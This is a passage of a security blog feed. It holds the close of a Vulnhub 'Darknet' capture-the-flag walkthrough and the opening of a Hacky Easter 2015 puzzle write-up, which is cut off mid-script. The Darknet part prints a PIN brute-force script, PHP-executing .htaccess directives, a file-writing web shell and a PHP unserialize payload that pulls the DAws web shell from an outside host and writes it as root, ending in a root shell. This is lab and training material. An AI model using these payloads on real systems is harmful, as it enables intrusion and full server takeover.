               &lt;span class="s1"&gt;'checkbox[]'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;attempt&lt;/span&gt;

              &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;'imag'&lt;/span&gt;&lt;span class="p"&gt;:(&lt;/span&gt;&lt;span class="s1"&gt;'info.txt'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'info.php'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'rb'&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;

    &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ploy_url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'Key incorrecta!'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;'Found pin: '&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;attempt&lt;/span&gt;
        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The correct PIN is &lt;code&gt;'37', '10', '59', '17'&lt;/code&gt;. I tried to upload a PHP script, but
that won't work. Seems uploading anything with a &lt;code&gt;php&lt;/code&gt; extension is forbidden.
Casting my mind back I noticed that in the apache config I noticed something interesting.
For this site &lt;code&gt;AllowOverride All&lt;/code&gt; is on. Most likely going to be something to
do with &lt;code&gt;.htaccess&lt;/code&gt;. To check this I upload the following file, and then browse to a
non-existant file, to generate a 404&lt;/p&gt;
&lt;pre class="code text literal-block"&gt;
Order deny,allow
Allow from all
ErrorDocument 404 https://google.com
&lt;/pre&gt;
&lt;p&gt;This should direct me to &lt;code&gt;google.com&lt;/code&gt;, which it does, indicating &lt;code&gt;.htaccess&lt;/code&gt; overrides work here.
So what can I do from here that will either allow me to upload a PHP shell or do something else?&lt;/p&gt;
&lt;p&gt;Unfortunately there's another issue: as I upload files, old files seem to get deleted.
I found this out when the 404 redirect stopped working after uploading an html file.&lt;/p&gt;
&lt;p&gt;Luckily I discovered that it's possible to execute php code inside the .htaccess file.&lt;/p&gt;
&lt;pre class="code text literal-block"&gt;
AddHandler application/x-httpd-php .htaccess
DirectoryIndex .htaccess
&amp;lt;FilesMatch &amp;quot;^\.htaccess&amp;quot;&amp;gt;
Order deny,allow
Allow from all
SetHandler application/x-httpd-php
&amp;lt;/FilesMatch&amp;gt;

#&amp;lt;?php print $_GET[&amp;quot;test&amp;quot;]; ?&amp;gt;
&lt;/pre&gt;
&lt;p&gt;Sure enough the &lt;code&gt;$_GET[&amp;quot;test&amp;quot;]&lt;/code&gt; variable is on the page. So this should allow me
to get a run some useful code on there somehow.&lt;/p&gt;
&lt;p&gt;After following some blind leads, I wrote a php script that would take a file encoded
with base64 and a filename via a &lt;code&gt;POST&lt;/code&gt; method and write this file out.
(Note: appending the entire script for DAws or similar didn't work).
Something like this should work though:&lt;/p&gt;
&lt;pre class="code php literal-block"&gt;
&lt;span class="x"&gt;$fp = fopen($_POST['name'], 'wb');
fwrite($fp, base64_decode($_POST['data']));
fclose($fp);&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;At the end of the &lt;code&gt;.htaccess&lt;/code&gt; file. However this always error with a permissions
error.&lt;/p&gt;
&lt;p&gt;After struggling with this for quite some time I got some help from a fellow
#vulnhub resident who helped me out with something I missed. It's &lt;code&gt;suphp&lt;/code&gt; not &lt;code&gt;php&lt;/code&gt;,
so I wasn't executing the script as the &lt;code&gt;errorlevel&lt;/code&gt; user. Derp.&lt;/p&gt;
&lt;p&gt;More info on &lt;a class="reference external" href="http://suphp.org/Home.html"&gt;suphp&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="stage-5"&gt;
&lt;h2&gt;Stage 5&lt;/h2&gt;
&lt;p&gt;So having sorted that I uploaded &lt;code&gt;DAws&lt;/code&gt; and got myself a reverse shell and explored
once more. Now inside &lt;code&gt;/var/www&lt;/code&gt; there's some files I missed earlier: &lt;code&gt;sec.php&lt;/code&gt;,
&lt;code&gt;Classes/Test.php&lt;/code&gt;, and &lt;code&gt;Classes/Show.php&lt;/code&gt;. Interesting.&lt;/p&gt;
&lt;p&gt;Trying to hit &lt;code&gt;darknet.com/sec.php&lt;/code&gt; errors. Let's take a look inside of it&lt;/p&gt;
&lt;pre class="code php literal-block"&gt;
&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class="k"&gt;require&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Classes/Test.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;require&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Classes/Show.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="k"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'test'&lt;/span&gt;&lt;span class="p"&gt;])){&lt;/span&gt;
    &lt;span class="nv"&gt;$d&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'test'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="nv"&gt;$j&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;unserialize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$d&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$j&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Rembering that we're dealing with suphp it could well be that the 500 error is
because &lt;code&gt;sec.php&lt;/code&gt; is trying to run as &lt;code&gt;root&lt;/code&gt;. Checking &lt;code&gt;/etc/suphp/suphp.conf&lt;/code&gt;
my suspicion is correct, the &lt;code&gt;min_uid&lt;/code&gt; and &lt;code&gt;min_gid&lt;/code&gt; settings are too high for
&lt;code&gt;root&lt;/code&gt; scripts to run. But hey, as luck would have it (thanks q3rv0) &lt;code&gt;suphp.conf&lt;/code&gt;
is &lt;code&gt;777&lt;/code&gt;. So heading straight to &lt;code&gt;sed&lt;/code&gt;&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; sed -i &lt;span class="s1"&gt;'s/min_uid=100/min_uid=0/g'&lt;/span&gt; suphp.conf
&lt;span class="go"&gt;sed: couldn't open temporary file ./sedm2LUZQ: Permission denied&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Hmph. Ok then I'll copy the &lt;code&gt;suphp.conf&lt;/code&gt; to &lt;code&gt;/tmp&lt;/code&gt; and edit it there, then copy
it back. Making sure I change both &lt;code&gt;min_uid&lt;/code&gt; and &lt;code&gt;min_gid&lt;/code&gt;, I reload &lt;code&gt;sec.php&lt;/code&gt; and
get a blank page. No errors are good errors.&lt;/p&gt;
&lt;p&gt;Now that I've got &lt;code&gt;sec.php&lt;/code&gt; running I can go ahead and see what we might be able to exploit.
Anything we do with this file will run as root, some hopefully this is the last part of
Darknet, because I want my life back :)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sec.php&lt;/code&gt; unserialises our input, which basically takes a serialised string
and &lt;a class="reference external" href="https://php.net/manual/en/function.unserialize.php"&gt;unserialises into an object&lt;/a&gt;.
Similar to Python's pickle. There's no way I can call a method on either of the classes,
so I have to see what will get called for me.
The &lt;code&gt;Test&lt;/code&gt; class has a rather useful destructor, which,
will write data to disk and make it world readable. Almost as if that's what
we're supposed to use.&lt;/p&gt;
&lt;pre class="code php literal-block"&gt;
&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Test&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;

    &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="nv"&gt;$url&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="nv"&gt;$name_file&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="nv"&gt;$path&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;__destruct&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
        &lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;file_get_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;url&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nv"&gt;$f&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;fopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;name_file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nb"&gt;fwrite&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$f&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nb"&gt;fclose&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$f&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nb"&gt;chmod&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;name_file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mo"&gt;0644&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;Show&lt;/code&gt; class on the other hand is only useful for testing, as this will provide visual
feedback when &lt;code&gt;sec.php&lt;/code&gt; gets rendered and runs the &lt;code&gt;echo&lt;/code&gt; statement. This will
invoke the &lt;code&gt;__toString&lt;/code&gt; method on the &lt;code&gt;Show&lt;/code&gt; class. Passing &lt;code&gt;test=O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;s:2:&amp;quot;XX&amp;quot;;}&lt;/code&gt;
will print &lt;code&gt;Showme&lt;/code&gt;, confirming that the serialisation worked.&lt;/p&gt;
&lt;p&gt;Now to get DAws on there as root. First things first I need to determine the serialised
string. I do this with a simple PHP script that searialises the &lt;code&gt;Test&lt;/code&gt; class and
prints out the string I need. Which is&lt;/p&gt;
&lt;pre class="code text literal-block"&gt;
O:4:&amp;quot;Test&amp;quot;:3:{s:3:&amp;quot;url&amp;quot;;s:30:&amp;quot;http://192.168.56.101/DAws.txt&amp;quot;;s:9:&amp;quot;name_file&amp;quot;;s:8:&amp;quot;DAws.php&amp;quot;;s:4:&amp;quot;path&amp;quot;;s:8:&amp;quot;/var/www&amp;quot;}
&lt;/pre&gt;
&lt;p&gt;Using Burp suite I use a &lt;code&gt;GET&lt;/code&gt; request to &lt;code&gt;sec.php&lt;/code&gt;, send it to &lt;code&gt;Repeater&lt;/code&gt; and convert
it to a &lt;code&gt;POST&lt;/code&gt; request with the required payload:&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/kiutbRt.png" style="width: 500px;" /&gt;
&lt;p&gt;Then I, once again, browse to my DAws url and bind a shell to finally get:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;#&lt;/span&gt; whoami &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; id
&lt;span class="go"&gt;root
uid=0(root) gid=0(root) groups=0(root)
&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; cat flag.txt
&lt;span class="go"&gt;      ___           ___           ___           ___           ___           ___           ___
     /\  \         /\  \         /\  \         /\__\         /\__\         /\  \         /\  \
    /::\  \       /::\  \       /::\  \       /:/  /        /::|  |       /::\  \        \:\  \
   /:/\:\  \     /:/\:\  \     /:/\:\  \     /:/__/        /:|:|  |      /:/\:\  \        \:\  \
  /:/  \:\__\   /::\~\:\  \   /::\~\:\  \   /::\__\____   /:/|:|  |__   /::\~\:\  \       /::\  \
 /:/__/ \:|__| /:/\:\ \:\__\ /:/\:\ \:\__\ /:/\:::::\__\ /:/ |:| /\__\ /:/\:\ \:\__\     /:/\:\__\
 \:\  \ /:/  / \/__\:\/:/  / \/_|::\/:/  / \/_|:|~~|~    \/__|:|/:/  / \:\~\:\ \/__/    /:/  \/__/
  \:\  /:/  /       \::/  /     |:|::/  /     |:|  |         |:/:/  /   \:\ \:\__\     /:/  /
   \:\/:/  /        /:/  /      |:|\/__/      |:|  |         |::/  /     \:\ \/__/     \/__/
    \::/__/        /:/  /       |:|  |        |:|  |         /:/  /       \:\__\
     ~~            \/__/         \|__|         \|__|         \/__/         \/__/



     Sabia que podias Campeon!, espero que esta VM haya sido de tu agrado y te hayas divertido
     tratando de llegar hasta aca. Eso es lo que realmente importa!.


&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt;Blog: www.securitysignal.org
&lt;span class="go"&gt;
&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt;Twitter: &amp;#64;SecSignal, &amp;#64;q3rv0
&lt;/pre&gt;
&lt;p&gt;I learned sooooo much through this VM. Many thanks to qu3rv0 for creating it,
Vulnhub for hosting it, and the people who helped me get through it (esp g0blin).&lt;/p&gt;
&lt;p&gt;I look forward to the next one.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="note"&gt;
&lt;h2&gt;Note&lt;/h2&gt;
&lt;p&gt;As it was possible to upload a shell with the SQL Admin page, browsing to &lt;code&gt;/var/www&lt;/code&gt; would have
taken us directly to the end stage. All the info was there and &lt;code&gt;suphp.conf&lt;/code&gt; is world writeable.
Had I done that though I would have missed out on the XPath challenge, which taught me some new tricks,
as well as all the other fun puzzles.&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>Hacky Easter 2015</title><link href="http://unlogic.co.uk/2015/06/01/hacky-easter-2015/" rel="alternate"></link><updated>2015-06-01T08:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-06-01:2015/06/01/hacky-easter-2015/</id><summary type="html">&lt;p&gt;Another year, another Hacky Easter and a month, of fun, learning, and
frustrations. All in all this was another great year and I'm already looking
forward to 2016's edition. I found this year's challenges were a bit harder than
last year, but I did my best.&lt;/p&gt;
&lt;div class="section" id="challenge-01"&gt;
&lt;h2&gt;Challenge 01&lt;/h2&gt;
&lt;p&gt;I'm told to search out the password in the following image&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/mIXj50g.jpg" style="width: 600px;" /&gt;
&lt;p&gt;Taking note of the missing letters and rearranging them to spell &lt;code&gt;HACKERZ&lt;/code&gt; I'll enter
that into the egg-o-matic and see what happens. Oh, hello there'e the egg.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-02"&gt;
&lt;h2&gt;Challenge 02&lt;/h2&gt;
&lt;p&gt;The eggs is already there:&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/98japcd.png" /&gt;
&lt;p&gt;But it won't scan in its current state, not with &lt;em&gt;NO&lt;/em&gt; written in the QR code.
First things first I looked at the page and image source. Turns out that this is
not an image, but a table instead. I examined the table with Firebug and noticed
that the elements of the &lt;em&gt;NO&lt;/em&gt; have different CSS tags. Looking up at the header I
saw that those tags were defined twice, causing the values to be overriden.&lt;/p&gt;
&lt;p&gt;I created a local copy, set the values to the initial values (so delete the second
definition) and then we get a valid QR code that will scan.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-03"&gt;
&lt;h2&gt;Challenge 03&lt;/h2&gt;
&lt;p&gt;Lego. I love Lego, and therefore already knew what an &lt;code&gt;ldx&lt;/code&gt; file is. So I opened
it in Lego Digital Designer and took a look at the bricks. Looks like quite a hard
code to crack. Although it seems a little odd that the bottom layer is 3 bricks deep.
I started picking away some of the first layer and there were white and black bricks
underneath. Potentially a QR code? Even using the &amp;quot;Select colour and shape&amp;quot; tool, removing
all the top layer bricks will take a little while, but we are then rewarded with a valid QR code.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-04"&gt;
&lt;h2&gt;Challenge 04&lt;/h2&gt;
&lt;p&gt;Mobile challenge. I get a list of numbers, or definitions of numbers,
and I have to arrange them in order. The easiest way to do this was to write them in a
file and then use the linux &lt;code&gt;sort&lt;/code&gt; command to order them accordingly. Once I had the
list it was just a matter of ordering them in the right order on the phone, and submitting them
to get the egg.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-05"&gt;
&lt;h2&gt;Challenge 05&lt;/h2&gt;
&lt;p&gt;Another mobile challange. I get shown four bars, each one of which is controlled
by some phone sensor. The middle two were easy to discover. Just by moving the phone I could
see that the orientation and tilt controlled those. The top bar increased every 5 seconds. The
bottom bar however was a bit trickier. It took a day to discover this, because it actually
represents the time the phone has been charging since the app was run for the first time.&lt;/p&gt;
&lt;p&gt;I left it plugged in and waited until the bar was green, aligned the phone correctly and then
waited for the 5 second bar to fill up to collect my egg.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-06"&gt;
&lt;h2&gt;Challenge 06&lt;/h2&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;dah-dah-dit dit dah-dah-dah di-dah-dit dah-dah-dit dit dah-dah dah-di-dah-dit di-di-dah-dit di-dah-di-dit dah-di-dah-dah&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;This is clearly morse code. &lt;code&gt;dit&lt;/code&gt; and &lt;code&gt;di&lt;/code&gt; are dots and the &lt;code&gt;dah&lt;/code&gt; is dash. Decoded this to get
&lt;code&gt;georgemcfly&lt;/code&gt;. I entered this and was told I was 3 months too early! Only one thing for it:
change the system date to 3 months in the future. Resubmitted the password and was granted the egg.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-07"&gt;
&lt;h2&gt;Challenge 07&lt;/h2&gt;
&lt;p&gt;Mobile challange. I need to navigate a Google street view style app to search for the
egg. I was actually surprised how easy it was to find. On the second screen
I looked up and there it was, in the sky. Easy right? Well, once I capped the image, I brought
it into Gimp and manipulated it. Took quite a bit of cleanup and contrast tweaking to get it to scan,
but I got there in the end.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-08"&gt;
&lt;h2&gt;Challenge 08&lt;/h2&gt;
&lt;p&gt;So from a spreadsheet ID I have to find this particular spreadsheet? Like any sensible person
I avoid working with spreadsheets as much as I can, so I had to investigate how Google
docs uses these IDs. Luckily once you create a new sheet, you can already identify the ID in the URL.
Replace your ID with the Hacky Easter one and you are given the sheet.&lt;/p&gt;
&lt;p&gt;The problem is that the sheet is jumbled up. You need to order the colums and rows in numerical order.
I could have done this in Python, but at the time I got &lt;em&gt;1&lt;/em&gt; back for the black boxes. Being
a spreadsheet n00b I didn't know about conditional formating, but you can specify cell formatting based
on content. So that would have been the easy way.&lt;/p&gt;
&lt;p&gt;Instead I did it manually. Ordering the rows can be done automatically. Then I just copy
pasted the colums in order and snapped the code. Tedious, but produces results.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-09"&gt;
&lt;h2&gt;Challenge 09&lt;/h2&gt;
&lt;p&gt;Mobile challenge. The app's splash screen is egg #9, but distorted. With some
skilled timing I screen capped it and imported it into Pixelmator, where I
used the bulge tool to undistort it enough to be able to scan it.&lt;/p&gt;
&lt;p&gt;Alternatively I could have grabbed the image out of the APK I reckon, but
this was simpler at the time.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-10"&gt;
&lt;h2&gt;Challenge 10&lt;/h2&gt;
&lt;p&gt;Thumper's got egg 10? Where could he have taken it? Initially I decided
to look in the other challenges and there is one challenge that has a banner
at the bottom. It is an advert for Thumper's info sec training course. Clicking
the banner merely told me that 'the egg is not in any challenge'. They knew we'd
come looking.&lt;/p&gt;
&lt;p&gt;So where else would people keep eggs? Of course, on the pages where you can see
the eggs each user has. The url for which is &lt;code&gt;http://hackyeaster.hacking-lab.com/hackyeaster/eggs.html?name=hops&lt;/code&gt;
so all we do it replace the user &lt;code&gt;hops&lt;/code&gt; with &lt;code&gt;Thumper&lt;/code&gt; and sure enough, that's
where he's hidden the egg.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-11"&gt;
&lt;h2&gt;Challenge 11&lt;/h2&gt;
&lt;p&gt;I was expecting this to be a bit harder, but I just downloaded the files,
opened them up in Thunderbird and found a message with attachments. Downloading
the attachment gives you the egg.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-12"&gt;
&lt;h2&gt;Challenge 12&lt;/h2&gt;
&lt;p&gt;A quiz! Simple of course. Well, this is Hacky Easter, so no. The fields are all
incorrectly configured. Look at the source and you can see:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Field 1 will change it contents when it loses focus.&lt;/li&gt;
&lt;li&gt;Field 2 is a number field but should be a string&lt;/li&gt;
&lt;li&gt;Field 3 is a text field but should be a number&lt;/li&gt;
&lt;li&gt;Field 4 is a radio button set, but should be checkboxes&lt;/li&gt;
&lt;li&gt;Field 5 is a dropdown that is missing the right answer&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So I worked out the answers, as I still need to get them right, and then I used
Firebug to edit the HTML in place. Once ready I hit &lt;em&gt;Submit&lt;/em&gt; only to find I was
wrong. I am sure everything was correct though. I double checked the fields, and
then I noticed that the submit button had &lt;code&gt;value=&amp;quot;false&amp;quot;&lt;/code&gt; on it.&lt;/p&gt;
&lt;p&gt;Once I edited them all again and set the submit button to &lt;code&gt;true&lt;/code&gt; I was granted access
to the egg.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-13"&gt;
&lt;h2&gt;Challenge 13&lt;/h2&gt;
&lt;p&gt;This challenge had me going for quite a while. A great example of how you learn
to observe information. Downloading the video I see a 15 minute video that has a
different QR code every second (approx). Each QR code resolves to a egg style
string, so there's no automated way to filter out the right code.&lt;/p&gt;
&lt;p&gt;I can't watch it and scan each egg, that would take forever. So I thought about
what I know. Eventually it dawned on me that it's called &lt;em&gt;LEET TV&lt;/em&gt;. Leet = 7337.
I wonder if... scrub the video to 7337 and scan the code. Error message.&lt;/p&gt;
&lt;p&gt;But careful, this isn't the same message as you would get if you scan an invalid
egg. I used a different barcode scanner to scan this code and was given a URL. Result!&lt;/p&gt;
&lt;p&gt;Visiting the URL I download a wav file, which is clearly a reversed audio recording.&lt;/p&gt;
&lt;p&gt;Importing into Audacity, reversing it, and playing it back tells us the timestamp
in the video where the correct QR is shown.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-14"&gt;
&lt;h2&gt;Challenge 14&lt;/h2&gt;
&lt;p&gt;On a hunch I just decided to use a 2d barcode scanner to scan the code and see
what happens. Oh, it gives us an egg string. But the app's scanner will only accept
2d codes. Not to worry. Using duckduckgo's qr code creator we can just enter the string
we get from the 1d code, and in return we get a 2d code which we can scan with the
Hacky Easter app.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-15"&gt;
&lt;h2&gt;Challenge 15&lt;/h2&gt;
&lt;p&gt;This one was fiendish for me. In the end I actually took apart the APK and
disassembled the code to try and see what this does. From this I could see
that it stores the pics on your SD card. It also runs some analysis on the images,
based on the pixel values. I assumed that it was in fact looking for a picture
of a tomato and a grassy field.&lt;/p&gt;
&lt;p&gt;I took a picture of a green screen and managed to get it to return one half of the
code. The tomato was a bit trickier, as a simply red image was not enough. It actually
needed &lt;em&gt;some&lt;/em&gt; green in it. Google image search for &lt;em&gt;tomato&lt;/em&gt; and took a reasonalbe pic,
which gave me the other half of the code.&lt;/p&gt;
&lt;p&gt;After downloading the pics to my desktop, it was just a matter of joining them together
to give me the complete egg.&lt;/p&gt;
&lt;p&gt;Was a little bit hit and miss with the pic taking, but nice idea for a challenge.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-16"&gt;
&lt;h2&gt;Challenge 16&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Ghosts only come out when it's dark...&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;This required a few things: a keen eye, and knowledge of crypto.&lt;/p&gt;
&lt;p&gt;So firstly we know that we need to make it dark or something. After a while
I finally noticed the light bulb at the bottom right of the main
challenges page. Clicking that makes the page dark and changes the thumbnail for
challenge 16. Now when we click on it we get a set of 4 strings and picture of
a &amp;quot;The Ring&amp;quot; girl with the word &lt;em&gt;spooky&lt;/em&gt; written across it. We are also told:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Dark is beautiful. A GOST with chaining appears and has a message for you&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Nothing is a coincidence, so that's no typo. Searching for &lt;em&gt;GOST&lt;/em&gt; I discovered that
it was an encryption method. After quite a bit more searching I discovered that
PHP's mcrypt library supports decrypting this cipher. The cipher requires a
key. On a hunch I decided to use the only other clue available: &lt;em&gt;spooky&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Now this is where I almost failed. I could decrypt the first code without any
problem. It resulted in the string &lt;code&gt;http://hackyeas&lt;/code&gt;. But the second string's
first 8 characters were corrupt. I was so stuck until I discovered that
you had to append all the ciphers together in order to get the plaintext. I guess
that's the &lt;code&gt;chaining&lt;/code&gt; part, as well as indicating we should used &lt;code&gt;MCRYPT_MODE_CBC&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This PHP script ended up doing the work for me&lt;/p&gt;
&lt;pre class="code php literal-block"&gt;
&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
